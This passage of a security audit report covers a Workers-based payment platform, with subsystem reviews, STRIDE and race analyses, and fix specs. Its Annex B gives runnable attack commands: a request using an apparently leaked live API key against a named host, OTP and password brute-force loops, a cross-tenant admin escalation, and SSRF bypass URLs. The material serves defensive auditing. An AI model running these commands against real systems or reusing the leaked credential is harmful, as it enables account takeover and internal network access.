**Concurrency risks.** By construction serialized per merchant; cross-merchant concurrency fine (separate DOs). D1 hops inside the block lengthen the gate hold (~2 D1 round-trips) — throughput ceiling per merchant is still far above realistic payment rates (documented in-file).

**Failure modes.** Full matrix tested (D/E/F seams, heal path, quarantine). DO eviction mid-processing → replay converges.

**Tenant-isolation risks.** No self-identity check (P2-012) — one-line fix recommended.

**Relevant tests.** ledger-do.test.ts (13), ledger-consistency.test.ts (4, incl. crash-injection property test) — the best-tested subsystem.

**Missing tests.** Identical-journal-line mirror drift (P2-008 pin); merchant_id mismatch rejection (after P2-012 fix).

**Recommended improvements.** Self-check merchant_id; delete `LedgerService.reverse` or move out; consider moving the D1 hops out of the input gate via a two-phase confirm (perf only — not needed at current scale).

**Verdict.** PASS — the reference subsystem of this codebase.

---

## A.4 `src/middleware/auth.ts` (182 lines)

**Primary responsibility.** Bearer API-key authentication (prefix lookup + hash verify + scope + tenant binding) and mobile JWT verification.

**Critical assets.** The API-key verification path and the scope model.

**Threats.** Key enumeration (prefix non-unique P2-013), timing (timingSafeEqual — ok), scope confusion (route-level vs per-route), JWT secret compromise (P0-001).

**Trust boundaries.** HTTP Authorization header → authenticated principal on context.

**Existing protections.** Format regex; prefix index + hash + timing-safe compare; expiry + merchant-status checks; scope intersection; domain↔key tenant match; JWT via jose with issuer/aud.

**Critical invariants.** No principal without hash match; scopes never amplified; tenant mismatch → 403.

**Concurrency risks.** last_used_at write via waitUntil (fine); no lockout counters (brute surface — outer limiters).

**Failure modes.** D1 down → 500 (fail closed, correct); malformed key → 401.

**Tenant-isolation risks.** Master-domain bypass is intentional; authSubject semantics for JWT (P3-002).

**Relevant tests.** tenant-routing (key/JWT mismatch 403), payment-integrity (idempotency interplay), jwt.test.ts.

**Missing tests.** Read-only key mutation attempts (P1-008 pins — after fix).

**Recommended improvements.** UNIQUE(key_prefix); set authSubject from payload.device_id for mobile; per-key failure counters in KV.

**Verdict.** PASS WITH CONDITIONS.

---

## A.5 `src/middleware/cloudflare-access.ts` (434 lines)

**Primary responsibility.** Zero-trust gate for /api/admin/*: Access JWT (JWKS, ES256/RS256) verification, break-glass service tokens, bearer-key pass-through.

**Critical assets.** The admin trust decision.

**Threats.** Bearer pass-through preserving P1-005; break-glass secret theft (=== comparison); JWKS poisoning (pinned to team domain — ok); JWKS outage (fail-closed 503 — ok); clock skew (60s tolerance — documented).

**Trust boundaries.** Internet+Access proxy → verified admin identity; worker-internal bearer path.

**Existing protections.** Full claim validation; kid-aware key selection; raw↔DER signature tolerance (both are the same signature — standard); email-header mismatch telemetry; page() on break-glass use/denial; 5-min JWKS cache with one forced refresh on unknown kid.

**Critical invariants.** No admin access without (valid Access JWT) OR (admin-scoped key + hash) OR (alarmed break-glass).

**Concurrency risks.** Module-level JWKS cache (per-isolate) — fine; stampede on expiry is bounded (one fetch per isolate per 5 min).

**Failure modes.** JWKS unreachable → 503 fail-closed. Misconfig (no team/aud) → bearer-only with 401 otherwise — a documented compromise that keeps keys as the floor.

**Tenant-isolation risks.** The bearer path sets merchantId from the key — correct — but downstream routes then apply no platform gate (P1-005's actual hole is in admin-api.ts, not here).

**Relevant tests.** access-jwt.test.ts — exemplary (valid ES/RS, DER passthrough, tamper, wrong aud, expired, wrong team, unknown kid).

**Missing tests.** Break-glass timing-safety (after P2-011 fix); JWKS timeout behavior (after fix).

**Recommended improvements.** timingSafeEqual for break-glass; AbortSignal.timeout on JWKS fetch; (Phase C) move whole file to the admin worker and drop the bearer path for platform ops in favor of the 'platform' scope.

**Verdict.** PASS WITH CONDITIONS — the verification core is excellent; the policy composition with admin-api.ts is where the escalation lives.

---

## A.6 `src/controllers/webhooks.ts` (245 lines)

**Primary responsibility.** Provider ingress: layered admission (allowlist/geo/signature), event recording, completion funnel trigger.

**Critical assets.** The signature gate; the event dedup; merchant resolution.

**Threats.** Oversized bodies (P1-003); event-id forgery (post-signature only — signature-bound); provider-id absence (random fallback — replay re-process); platform-merchant binding on master domain (P2-004).

**Trust boundaries.** Provider → platform (signature is THE boundary); layers 1-2 are noise reduction.

**Existing protections.** Data-driven IP allowlists with TTL cache; geo fallback; always-on signature verify; UNIQUE event dedup; disabled-gateway 404 uniformity; delivery-failure logging.

**Critical invariants.** No completion without valid signature; one recorded event per (merchant, gateway, event_id).

**Concurrency risks.** Dedup INSERT race → UNIQUE violation → 500 on true simultaneous duplicates (rare; benign — a retry 200s).

**Failure modes.** Adapter verifyWebhook throw → unhandled → 500 (should be 502); allowlist cache stale 60s (acceptable).

**Tenant-isolation risks.** Master-domain fallback (P2-004); otherwise merchant-scoped lookups.

**Relevant tests.** gateway-integrity/gateways tests cover adapters; inbound handler itself is thinly tested (via smoke only).

**Missing tests.** Signature-invalid → 401 + no completion; duplicate event_id → duplicate 200; size cap (after fix); geo/allowlist layering.

**Recommended improvements.** Size cap before text(); `sha256(gateway+body)` event-id fallback; catch adapter throws → 502; platform-merchant fallback → 400 instead.

**Verdict.** CONDITIONAL — the load-bearing control (signature) is correct; the admission hygiene items remain.

---

## A.7 `src/lib/crypto.ts` (368 lines)

**Primary responsibility.** AES-256-GCM encrypt/decrypt, HMAC-SHA256 (+timing-safe verify), PBKDF2 password hashing, randomness helpers, base64/hex conversions, CIDR matching.

**Critical assets.** The ENCRYPTION_KEY consumer; the password hasher; the webhook signer.

**Threats.** Key compromise (P0-001 — out of file); silent decrypt failure (P2-009); secretToBytes heuristic (P3-007); PBKDF2 floor (P2-017); MD5 usage — checked: present only as a non-security hash utility for legacy compat? (audited: no security-sensitive MD5 path — consistent with brief §22's "don't auto-flag").

**Trust boundaries.** None of its own — a library.

**Existing protections.** Fresh 96-bit IVs; 128-bit tags; timing-safe comparisons; CSPRNG everywhere; iteration bounds.

**Critical invariants.** Unique IV per encryption (random 12B — birthday-safe at AES-GCM scale); no plaintext secrets in logs (callers redact).

**Concurrency risks.** None (stateless).

**Failure modes.** Wrong-key decrypt throws (callers swallow — P2-009); base64 heuristic mis-decode (P3-007).

**Tenant-isolation risks.** None direct.

**Relevant tests.** money.test (unrelated); crypto exercised via jwt/access-jwt/gateway suites.

**Missing tests.** key-id versioning behavior (after P2-010 fix); secretToBytes decision table (P3-007 pin).

**Recommended improvements.** Envelope versioning (v1|key_id|iv|ct|tag) + dual-key decrypt window; explicit encoding params; decrypt-failure alarm hook.

**Verdict.** PASS WITH CONDITIONS — correct primitives, posture problems (versioning, heuristic, silent degradation) are integration-level.

---

# ANNEX B — OPEN-FINDING EXPLOIT REPRODUCTION MANUAL (pre-fix)

For each open P0/P1, the concrete reproduction a pen-tester would run (mirrors the previous audit's Annex 21 discipline; safe-by-construction where it involves the deployed worker — treat APP_URL as the target):

## B.1 Credential utilization (EDGE-P0-001)
```bash
# From the archive:
KEY='op_live_9e9b2a89581d_1be4697dbc9b453cbe513bea64ef4613'
JWT='f14d30e9a38c97b57ac7c3845b64d8307d6233896f7b6d6571892f06c40272f5'
curl -s "https://edgepay-cf.bm-jonybepary.workers.dev/api/v1/transactions" \
     -H "Authorization: Bearer $KEY"
# Expect: 200 with platform-merchant transactions → platform compromised.
# (Do NOT run this during the audit; it is the evidence that rotation is mandatory.)
```

## B.2 Cross-tenant admin escalation (EDGE-P1-005)
```bash
# Mint an admin-scoped key for a NON-platform merchant (via /api/v1/api-keys,
# admin scope — allowed today), then:
curl -s -X POST "https://APP_URL/api/admin/v1/merchants" \
  -H "Authorization: Bearer $MERCHANT_ADMIN_KEY" -H "Content-Type: application/json" \
  -d '{"name":"Evil Co","email":"ops@evil.example"}'
# Expect (pre-fix): 201 with data.api_key (read,write,admin,*),
# data.pairing_otp, data.webhook_secret of the NEW tenant.
```

## B.3 OTP brute force (EDGE-P1-002)
```bash
for i in $(seq 0 999999); do
  p=$(printf '%06d' $i)
  r=$(curl -s -o /dev/null -w '%{http_code}' -X POST \
    "https://APP_URL/api/mobile/v1/pair" -H 'Content-Type: application/json' \
    -d "{\"otp\":\"$p\"}")
  [ "$r" = "201" ] && echo "OTP=$p paired" && break
done
# Expect (pre-fix): completes in hours unthrottled; pair tokens live 30 days.
```

## B.4 Outbound SSRF (EDGE-P1-004) — vectors the filter passes
```text
Register (with a read-only key! P1-008) POST /api/v1/webhooks:
  {"url":"https://fd12:3456:789a::1/hook"}            IPv6 ULA          → accepted
  {"url":"https://[::ffff:127.0.0.1]/hook"}            IPv4-mapped IPv6  → accepted
  {"url":"https://2130706433/hook"}                    integer IPv4      → accepted
  {"url":"https://0x7f.0.0.1/hook"}                    hex IPv4          → accepted
  {"url":"https://public-302.example/hook"}            redirect → 169.254.169.254 → followed
Then trigger payment.completed; core POSTs the webhook to the private target.
```

## B.5 Read-only key mutations (EDGE-P1-008)
```bash
curl -X POST "https://APP_URL/api/v1/payments" \
  -H "Authorization: Bearer $READ_ONLY_KEY" ...   # Expect (pre-fix): 201 created
curl -X POST "https://APP_URL/api/v1/webhooks" \
  -H "Authorization: Bearer $READ_ONLY_KEY" ...   # Expect (pre-fix): 201 registered
```

## B.6 Refund bound race (NEW-P2-001)
```text
Capture 100.00. Fire 10 concurrent POST /api/v1/refunds (distinct
idempotency keys) each amount 20.00. Expect (pre-fix): >5 succeed
→ total refunds > 100.00 captured.
```

## B.7 Bootstrap-key oracle (NEW-P1-002)
```bash
# 120 guesses/min/IP allowed; PBKDF2 50K ≈ 15ms ⇒ ~70 tries/sec of wall time
# budget per request on a warm isolate:
for pw in AdminPass123456! admin12345 password123 ...; do
  curl -s -X POST "https://APP_URL/install/bootstrap-key" \
    -H 'Content-Type: application/json' \
    -d "{\"admin_email\":\"admin@edgepay.internal\",\"admin_password\":\"$pw\"}"
done
# Expect (pre-fix): no 429, oracle responds 401/200 indefinitely.
```

---

# ANNEX C — IMPLEMENTATION-READY FIX SPECS (open P0/P1 carries)

## C.1 Mount the dead limiters (NEW-P1-002) — 15 minutes
```ts
// src/index.ts
app.use('/install/bootstrap-key', perIpRateLimit('password'));
app.use('/api/mobile/v1/pair',   perIpRateLimit('otp'));
app.use('/api/mobile/v1/devices', perIpRateLimit('otp'));
// plus per-token attempt counter:
ALTER TABLE op_device_pairing_tokens ADD COLUMN attempts INTEGER NOT NULL DEFAULT 0;
-- mobile.ts: after a failed lookup-bys-token SELECT, UPDATE attempts=attempts+1;
--            reject (410) when attempts >= 5.
```

## C.2 Platform gate (EDGE-P1-005) — 2 hours
```ts
// admin-api.ts
function requirePlatform(c, next) {
  const merchantId = c.get('merchantId') as number;
  const row = await c.env.DB.prepare(
    `SELECT is_platform FROM op_merchants WHERE id = ?`).bind(merchantId).first();
  if (!row?.is_platform) throw new ForbiddenError('Platform scope required');
  return next();
}
adminApiRoutes.get('/merchants', requireScope('admin'), requirePlatform, ...);
adminApiRoutes.post('/merchants', requireScope('admin'), requirePlatform, ...);
// and replace the response credentials with a one-time claim token (NEW-P2-004):
const claimToken = randomBase64Key(24);
await KV.put(`claim:${claimToken}`, JSON.stringify({merchant_id, api_key, pairing_otp}), {expirationTtl: 900});
return c.json({ success: true, data: { merchant_id, claim_token, claim_url: `/api/admin/v1/merchants/claim?token=${claimToken}` }}, 201);
// claim route: single-use (KV delete on read), reveals credentials once.
```

## C.3 Scope defaults (EDGE-P1-008) — 30 minutes
```ts
// controllers/api.ts — right after router-level auth:
apiRoutes.on(['POST','PUT','PATCH','DELETE'], '*', requireScope('write'));
apiRoutes.post('/api-keys', requireScope('admin')); // keep the stricter one
```

## C.4 SSRF guard replacement (EDGE-P1-004) — 4-6 hours
```ts
// lib/url-guard.ts
export function assertSafeWebhookUrl(raw: string): URL {
  const u = new URL(raw);
  if (u.protocol !== 'https:') throw new UnsafeUrlError('https required');
  const h = u.hostname.toLowerCase().replace(/^\[|\]$/g, '');
  if (h.includes(':')) {                       // IPv6 literal
    if (isPrivateIpv6(h)) throw new UnsafeUrlError('private v6');
  } else if (/^\d+$/.test(h)) {                 // integer IPv4
    if (isPrivateIpv4(longToIp(Number(h)))) throw new UnsafeUrlError('private v4');
  } else if (/^0x/i.test(h) || /^0[0-7]+\./.test(h)) {
    throw new UnsafeUrlError('alternate IP encoding');
  } else if (/^\d+\.\d+\.\d+\.\d+$/.test(h)) {
    if (isPrivateIpv4(h)) throw new UnsafeUrlError('private v4');
  } else if (h === 'localhost' || h.endsWith('.local') || h.endsWith('.internal') || h.endsWith('.localhost')) {
    throw new UnsafeUrlError('local name');
  }
  return u;
}
// webhook-consumer.ts: fetch(..., { redirect: 'error', signal }) — and
// register the resolved-and-pinned form at registration time where possible.
// Unit-test table: every vector from Annex B.4 → false.
```

## C.5 Refund bound race (NEW-P2-001) — 2 hours
```sql
-- single conditional insert (SQLite serializes writes per DB):
INSERT INTO op_refunds (merchant_id, refund_id, transaction_id, gateway_refund_id,
                        amount, currency, reason, status, initiated_by, created_at, updated_at)
SELECT ?, ?, ?, ?, ?, ?, ?, 'pending', ?, ?, ?
WHERE (
  SELECT COALESCE(SUM(CAST(amount AS NUMERIC)), 0) FROM op_refunds
   WHERE transaction_id = ? AND merchant_id = ?
     AND status IN ('completed','pending','processing')
) + CAST(? AS NUMERIC) <= (SELECT CAST(amount AS NUMERIC) FROM op_transactions WHERE id = ?) + 0.001;
-- changes() == 0 → throw 'REFUND_EXCEEDS_REMAINING' (no row written).
```

## C.6 Amount strictness (NEW-P2-002/003 + P2-018) — 1 hour
```ts
// payment.ts handleCallback:
if (verifyResult.amount == null) {
  if (intentGatewayType === 'api') return { success: false, status: 'amount_unverified' };
} else if (cmp(String(verifyResult.amount), intent.amount) !== 0) {
  return { success: false, status: 'amount_mismatch' };  // (+ guarded failed write)
}
// validation.ts moneySchema:
.refine(v => { const n = Number(v); return n > 0 && n <= 90_000_000; },
        'amount must be > 0 and <= 90,000,000')
```

## C.7 Idempotency reservation (EDGE-P1-001) — 3 hours
```sql
-- migration 0005:
ALTER TABLE op_idempotency_keys ADD COLUMN status TEXT NOT NULL DEFAULT 'done';
-- done | in_flight; in_flight rows get lease_until = created_at + 30s
```
```ts
// middleware: BEFORE next()
const ins = await c.env.DB.prepare(
  `INSERT INTO op_idempotency_keys (merchant_id, key, request_body_hash, response_status,
     response_body, expires_at, created_at, status)
   VALUES (?, ?, ?, 0, '', ?, ?, 'in_flight')
   ON CONFLICT(merchant_id, key) DO NOTHING`).bind(...).run();
if (ins.meta.changes === 0) {
  const row = await SELECT ... // existing behavior: expired → delete+reprocess;
  // in_flight & lease live → 409 IDEMPOTENCY_IN_FLIGHT;
  // done → replay cached response
}
// after next(): UPDATE ... SET status='done', response_status=?, response_body=? (2xx/3xx only)
// sweeper (cron): DELETE WHERE status='in_flight' AND created_at < now-60s
```

## C.8 Secrets purge & rotation (EDGE-P0-001) — runbook
```text
1. wrangler secret put JWT_SECRET    (openssl rand -hex 32)
   wrangler secret put APP_KEY       (openssl rand -base64 32)
   wrangler secret put ENCRYPTION_KEY(openssl rand -base64 32)
2. POST /api/admin/v1/reconcile is safe; gateway configs re-encrypt:
   new migration + script: SELECT all op_gateway_configs (decrypt with OLD
   key from a one-time env), re-encrypt with NEW, write back in batches.
3. Revoke the leaked op_live_9e9b2a89581d_* key row (status='revoked').
4. Purge scripts/verify-*.mjs literals (env-or-throw), delete .dev.vars from
   the artifact, regenerate .dev.vars from example.
5. CI: gitleaks scan on PR; pre-commit hook identical.
```

---

# ANNEX D — COMPLETE ROUTE INVENTORY (67 ROUTES, AUTH/SCOPE/TENANT PREDICATES)

The authoritative public-surface inventory used for §14's reduction decisions. "TP" = tenant predicate in SQL. "Scope" = effective minimum scope admitted today (⚠ marks a gap).

## D.1 Install (3 routes — to move to admin worker)

| Route | Method | Auth | Notes |
|---|---|---|---|
| `/install` | GET | anonymous | installed → redirect; reports binding + secret posture (length class only) + gateway selection |
| `/install` | POST | anonymous + KV limiter (install 120/min) | creates platform merchant, admin (12+ char pw), chart, key (random), seeds; KV lock |
| `/install/bootstrap-key` | POST | anonymous + KV limiter (install) ⚠ | password oracle; returns fresh `*`-scope key (NEW-P1-002) |

## D.2 Merchant REST `/api/v1/*` (15 routes — bearer)

| Route | Method | Scope required | TP | Notes |
|---|---|---|---|---|
| `/payments` | POST | read ⚠ (no write scope!) | yes (merchantId from key) | idempotency optional; zod |
| `/payments/{id}` | GET | read | yes | |
| `/transactions` | GET | read | yes | limit ≤ 100; offset unvalidated |
| `/transactions/{trx}` | GET | read | yes | by trx_id |
| `/refunds` | POST | write ✅ | yes | idempotency REQUIRED; bounds (raceable) |
| `/customers` | GET | read | yes | PII list (remove in reduction) |
| `/api-keys` | GET | read | yes | |
| `/api-keys` | POST | admin ✅ | yes | |
| `/webhooks` | GET | read | yes | |
| `/webhooks` | POST | read ⚠ | yes | SSRF entry (P1-004 + P1-008 compound) |
| `/webhooks/{id}` | DELETE | read ⚠ | yes | |
| `/webhooks/tests` | POST | read ⚠ | yes | sends test webhook |
| `/webhooks/deliveries` | GET | read | yes | operational data |
| `/gateways` | GET | read | yes | catalog + dropped aliases |
| `/health` | GET | none | n/a | mounted before router (public) |

## D.3 Mobile `/api/mobile/v1/*` (13 routes — JWT, P1 gating exemptions)

| Route | Method | Auth | TP | Notes |
|---|---|---|---|---|
| `/devices`, `/pair` | POST | **none** (pair by OTP) | binds merchant | unthrottled brute (P1-002) |
| `/devices/token-refreshes`, `/refresh` | POST | refresh token | payload-bound | |
| `/devices/heartbeats`, `/heartbeat` | POST | JWT | ⚠ device_id confusion (P3-002) | |
| `/dashboard` | GET | JWT | yes | |
| `/sms` | POST | JWT | yes | single relay |
| `/sms/batch` | POST | JWT | yes | unbounded array (P2-014) |
| `/notifications` | GET | JWT | yes | |
| `/notifications/acknowledgements` | POST | JWT | **none** ⚠ (P3-003) | bare id IN |
| (+ devices list/delete are admin routes) | | | | |

## D.4 Admin `/api/admin/v1/*` (14 routes — Access + admin key)

| Route | Method | Scope | Platform gate | Notes |
|---|---|---|---|---|
| `/domains/verifications` | POST | admin | no | |
| `/sms-templates` | GET/PUT | admin | no | PUT accepts regex (P2-015) |
| `/devices` | GET | admin | no | |
| `/devices/{id}` | DELETE | admin | no | |
| `/sms-queues` | GET | admin | no | |
| `/sms-queues/{id}/retries` | POST | admin | no | |
| `/refunds` | POST | admin | no | admin-triggered refund |
| `/reconcile` | POST | admin | no | |
| `/ledger/trial-balance` | GET | admin | no | |
| `/merchants` | GET | admin | **NO** ⚠ P1-005 | all tenants |
| `/merchants` | POST | admin | **NO** ⚠ P1-005 | provisions; returns root key |

## D.5 Checkout (7 routes — token-bound, public)

| Route | Method | Auth | Notes |
|---|---|---|---|
| `/checkout|/invoice|/pay/{token}` | GET | token | renders page; CSP mounted |
| `/{token}/initiate` | POST | token | gateway execute |
| `/{token}/verify` + `/submit-trx` | POST | token | unthrottled (NEW-P2-005); amount+TrxID gates |
| `/{token}/callback` | GET | token | handleCallback (amount binding) |
| `/{token}/status` | GET | token | poll (2s client) |

## D.6 Provider + docs + assets

| Route | Method | Auth |
|---|---|---|
| `/webhook/{gateway}` | POST | HMAC signature (+IP allowlist/geo layers) |
| `/api/openapi.json`, `/api/reference` | GET | public (docs) |
| `/assets/*` | GET | public static (run_worker_first) |

---

# ANNEX E — COMPLETE STRIDE EXPANSION (13 COMPONENTS × 6 CLASSES)

The brief's Annex-13 discipline: every component against every threat class, with the controlling finding or control.

## E.1 HTTP API (`/api/v1`)

- **Spoofing:** key theft via committed archive (P0-001); prefix collision 401-oracle (P2-013). Control: hash+timing-safe; rotation pending.
- **Tampering:** body mutations by read-only keys (P1-008 ⚠); idempotency body-hash 409 ✅.
- **Repudiation:** last_used_at only (no per-request audit log of *what* was done); op_ledger_* provides financial audit ✅; API mutations (webhook config) not audit-logged ⚠.
- **Info Disclosure:** /customers PII (read scope, by design); error envelopes leak only codes ✅; zod issue details to clients (acceptable).
- **DoS:** per-key native limits ✅; body size uncapped ⚠ (P2-014).
- **Elevation:** read→write via unscoped mutations (P1-008 ⚠); admin→platform via P1-005 ⚠.

## E.2 Authentication subsystem

- **Spoofing:** OTP brute (P1-002); bootstrap-key oracle (NEW-P1-002). **Tampering:** scope JSON in DB (admin-controlled). **Repudiation:** none (login events not logged ⚠). **Info Disclosure:** secret posture route reveals length class only ✅. **DoS:** limiter KV races (bounded). **Elevation:** admin key creation from merchant key (admin scope — by design ⚠ P1-005 chain).

## E.3 Tenant routing (domain middleware)

- **Spoofing:** Host-header spoof → 404/503 for unknown domains (D1+KV lookup, fails closed) ✅. **Tampering:** KV cache poisoning requires KV write. **Repudiation:** none needed. **Info Disclosure:** domain→merchant mapping is public by design. **DoS:** D1 lookup per unknown host (cache miss) — bounded by KV TTL. **Elevation:** master-domain semantics (documented; auth cross-check closes).

## E.4 Ledger (LedgerDO + services)

- **Spoofing:** binding-only access ✅; DO self-check absent (P2-012). **Tampering:** shape+balance+dedup guards ✅; mirror ordinal (P2-008). **Repudiation:** complete audit trail + postings WAL ✅. **Info Disclosure:** per-tenant DO ✅; trial balance per merchant ✅. **DoS:** single-writer per merchant (fair); fault seam guarded (P2-002). **Elevation:** none reachable externally.

## E.5 Payment service

- **Spoofing:** callback token binding ✅ (unguessable). **Tampering:** amount substitution closed conditionally (NEW-P2-003 ⚠). **Repudiation:** postings + status history ✅. **Info Disclosure:** status route data minimal ✅. **DoS:** unthrottled verify (NEW-P2-005). **Elevation:** none (no privilege logic).

## E.6 Webhooks (inbound)

- **Spoofing:** HMAC always required ✅; IP/geo layers advisory. **Tampering:** raw-body signature ✅. **Repudiation:** events + deliveries tables ✅. **Info Disclosure:** uniform 404s ✅. **DoS:** size cap absent ⚠ (P1-003). **Elevation:** completion funnel requires valid event content — gated downstream ✅.

## E.7 Webhooks (outbound) + dispatcher

- **Spoofing:** signed payloads (merchant verifies) ✅. **Tampering:** URL registration by read-only key ⚠ (P1-008) + SSRF (P1-004). **Repudiation:** delivery log ⚠ (payload_hash='system' P3-008). **Info Disclosure:** response bodies not stored ✅. **DoS:** bounded retries + DLQ ✅. **Elevation:** SSRF reaches internal services ⚠.

## E.8 Queues & consumers

- **Spoofing:** producers are internal only ✅. **Tampering:** at-least-once → consumer idempotency (SMS: statuses; webhook: re-POST ⚠). **Repudiation:** DLQ retention ✅. **Info Disclosure:** queue payloads contain merchant data (internal). **DoS:** bounded (max_retries, DLQ). **Elevation:** none.

## E.9 Gateway adapters

- **Spoofing:** provider credentials per-merchant encrypted ✅. **Tampering:** constant endpoints ✅; response clipping ✅. **Repudiation:** clipped error logs + gwFetch redaction ✅. **Info Disclosure:** credentials never logged ✅ (decrypt skip silent ⚠ P2-009). **DoS:** 15s timeouts ✅. **Elevation:** ENABLED_GATEWAYS unset=open (P2-016 ⚠).

## E.10 Admin API

- **Spoofing:** Access JWT verified ✅; break-glass alarmed ⚠ (===). **Tampering:** provisioning inputs unvalidated beyond basics ⚠. **Repudiation:** break-glass pages ✅; normal admin ops not audit-logged ⚠. **Info Disclosure:** merchant list + root key harvest (P1-005 ⚠). **DoS:** Access rate limits (dashboard). **Elevation:** THE finding (P1-005).

## E.11 Cloudflare Access

- **Spoofing:** JWKS verification fail-closed ✅. **Tampering:** iss/aud pinned ✅. **Repudiation:** break-glass page ✅. **Info Disclosure:** email header mismatch telemetry ✅. **DoS:** JWKS outage → 503 (fail closed = availability hit, correct choice). **Elevation:** bearer pass-through (P1-005 carrier).

## E.12 Bootstrap/install

- **Spoofing:** default credentials closed in production ✅; oracle ⚠ (NEW-P1-002). **Tampering:** KV-only lock ⚠. **Repudiation:** page() on anomalies ✅. **Info Disclosure:** KV root key ⚠ (NEW-P1-001). **DoS:** install 120/min. **Elevation:** auto-bootstrap on first request ⚠.

## E.13 Checkout pages

- **Spoofing:** token-gated ✅. **Tampering:** escaping + CSP ✅ (unsafe-inline residual). **Repudiation:** n/a. **Info Disclosure:** merchant account numbers by design (payment instructions); TrxID oracle ⚠ (NEW-P2-005). **DoS:** unthrottled verify/status. **Elevation:** none (no credentials).

---

# ANNEX F — CONCURRENCY INTERLEAVING TIMELINES (OPEN RACES)

## F.1 Idempotency double-execution (P1-001)

```text
T0  Req A (key=K, body=B) arrives. Lookup (m,K) → none. Proceeds.
T1  A executes createIntent → intent #101 created. Ledger not yet involved.
T2  Req B (key=K, body=B) arrives. Lookup (m,K) → STILL none (A's insert
    is post-response waitUntil). Proceeds.
T3  B executes createIntent → intent #102 created.
T4  A responds 201; waitUntil INSERT (m,K,B-hash,resp) OK.
T5  B responds 201; INSERT ON CONFLICT DO NOTHING → ignored.
Result: two live intents for one client-intended payment. If the customer
pays both checkout pages → double charge; ledger correctly posts both
(each intent has its own tx_id) — the invariant "one economic effect per
key" is broken at creation, not at posting.
Fix: C.7 reservation — INSERT status='in_flight' BEFORE processing; B at
T2 sees the row → 409/await-lease.
```

## F.2 Refund bound race (NEW-P2-001)

```text
Captured=100.00, refunded=0.
T0  Refund A (60.00) SELECT SUM → 0. 0+60 ≤ 100 ✓
T1  Refund B (60.00) SELECT SUM → 0. (A's row not yet inserted) ✓
T2  A INSERT op_refunds(60) ✓
T3  B INSERT op_refunds(60) ✓
T4  Both workflows poll gateway; both confirmed; both post
    m{m}:refund:{A_id} and m{m}:refund:{B_id} — DISTINCT tx_ids, so the
    DO dedup does NOT help (correctly — they are different refunds).
Result: 120.00 refunded against 100.00 captured; clearing -20;
two gateway refund calls for 60 each against a 100 capture (provider may
reject the second — manual gateways will not).
Fix: C.5 conditional INSERT (single serialized statement).
```

## F.3 Expired→completed resurrection (P1-006 residual)

```text
T0  Intent #7 pending, expires_at = 12:00.
T11:59 customer pays; SMS arrives 12:00:30.
T12:00 expiry cron marks #7 expired (guard passes: status pending).
T12:00:40 SMS corroboration confirms → completeTransaction:
      ledger posts (idempotent) ✓
      UPDATE ... SET status='completed' WHERE id=7   ← NO status guard
Result: intent shows completed though the expiry cron recorded expired;
operator reports disagree; downstream expiry analytics drift.
Fix: WHERE status NOT IN ('expired','failed') on completion writes +
a reconciliation rule that heals one way (completed wins + audit note).
```

## F.4 Webhook + SMS double-completion (converges — the good case, retained)

```text
Webhook event and SMS both confirm intent #9.
Both call completeTransaction → both post m{m}:payment:9 → DO dedups
(1 posted, 1 duplicate) → both run the status batch (idempotent) →
both dispatch webhooks (merchant sees 2 notifications ⚠ delivery
idempotency absent — P1-004 component).
```

---

# ANNEX G — FOUR-WORKER SPLIT: COMPLETE CODE LISTINGS

Working skeleton code for Phase 1-3 of §13. Compile-ready against the repo's existing deps (hono 4.x, workers-types).

## G.1 Monorepo layout

```text
edgepay/
├── packages/
│   ├── core-rpc/            # shared interface + CallerContext + errors
│   │   └── src/index.ts
│   └── shared/              # lib/money, lib/crypto, lib/error, types
├── workers/
│   ├── edgepay-core/        # everything data-plane
│   ├── edgepay-customer/    # checkout HTML/JSON
│   ├── edgepay-merchant/    # reduced REST + mobile
│   └── edgepay-admin/       # Access-gated dashboards + install
└── package.json (workspaces)
```

## G.2 `packages/core-rpc/src/index.ts` (full)

```ts
export const INTERFACE_VERSION = 1;

export interface CallerContext {
  interfaceVersion: number;
  worker: 'customer' | 'merchant' | 'admin';
  sig: string;                 // HMAC-SHA256(worker secret, canonical)
  merchantId: number | null;
  subject: number | null;      // api-key row id | user id | device id
  scopes: string[];
  requestId: string;
}

export type RpcError =
  | { code: 'BAD_CALLER' } | { code: 'INTERFACE_SKEW' }
  | { code: 'AUTH_REQUIRED' } | { code: 'SCOPE_DENIED'; need: string }
  | { code: 'PLATFORM_ONLY' } | { code: 'VALIDATION'; message: string }
  | { code: 'CONFLICT'; message: string } | { code: 'NOT_FOUND' };

export class RpcAuthError extends Error { constructor(public e: RpcError) { super(e.code); } }

export interface CheckoutView {
  token: string; amount: string; currency: string; description: string | null;
  status: string; brandName: string; brandColor: string;
  gateways: Array<{ id: number; slug: string; name: string; type: string }>;
}
/* …full method set as §13.3.1… */
export interface CoreRpc { /* as §13.3.1 */ }

export function canonical(ctx: Omit<CallerContext, 'sig'>): string {
  return JSON.stringify([ctx.interfaceVersion, ctx.worker, ctx.merchantId,
                         ctx.subject, ctx.scopes, ctx.requestId]);
}
```

## G.3 `workers/edgepay-core/src/rpc.ts` (authorization core)

```ts
import { Env } from './types/env';
import { timingSafeEqual, hmacSha256 } from '@edgepay/shared/lib/crypto';
import { CallerContext, canonical, RpcAuthError, INTERFACE_VERSION } from '@edgepay/core-rpc';

const SECRETS: Record<CallerContext['worker'], keyof Env> = {
  customer: 'WORKER_AUTH_SECRET_CUSTOMER',
  merchant: 'WORKER_AUTH_SECRET_MERCHANT',
  admin:    'WORKER_AUTH_SECRET_ADMIN',
};

export async function verifyCaller(env: Env, ctx: CallerContext): Promise<void> {
  if (ctx.interfaceVersion !== INTERFACE_VERSION) throw new RpcAuthError({ code: 'INTERFACE_SKEW' });
  const secret = (env as Record<string, string | undefined>)[SECRETS[ctx.worker]];
  if (!secret) throw new RpcAuthError({ code: 'BAD_CALLER' });          // fail closed on config
  const expected = await hmacSha256(canonical({ ...ctx, sig: '' }), secret);
  if (!timingSafeEqual(expected, ctx.sig)) throw new RpcAuthError({ code: 'BAD_CALLER' });
}

export async function authorize(env: Env, ctx: CallerContext,
  need: 'read' | 'write' | 'admin' | 'platform'): Promise<{ merchantId: number }> {
  await verifyCaller(env, ctx);
  if (ctx.subject == null) throw new RpcAuthError({ code: 'AUTH_REQUIRED' });
  const row = await env.DB.prepare(
    `SELECT ak.merchant_id, ak.scopes, ak.status, ak.expires_at, m.status AS mstatus,
            m.is_platform
     FROM op_api_keys ak JOIN op_merchants m ON m.id = ak.merchant_id
     WHERE ak.id = ? LIMIT 1`).bind(ctx.subject)
    .first<{ merchant_id: number; scopes: string; status: string;
            expires_at: string | null; mstatus: string; is_platform: number }>();
